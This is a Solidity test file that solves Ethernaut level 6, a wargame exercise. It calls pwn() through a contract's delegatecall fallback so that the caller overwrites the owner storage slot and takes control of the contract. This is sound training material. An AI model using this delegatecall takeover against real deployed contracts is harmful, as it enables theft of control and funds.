// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level6 {
    function pwn() external;
}

contract Level6Test is EthernautTest {
    function testLevel6() public {
        _createLevel("6");
        Level6 levelInstance6 = Level6(levelInstance["6"]);

        // Contract fallback has delegatecall to Delegate contract, forwarding msg.data
        // Owner storage variable is in the same slot position
        // We can encode msg.data with pwn() to set ourselves as the owner
        levelInstance6.pwn();

        require(_submitLevel("6"));
    }
}
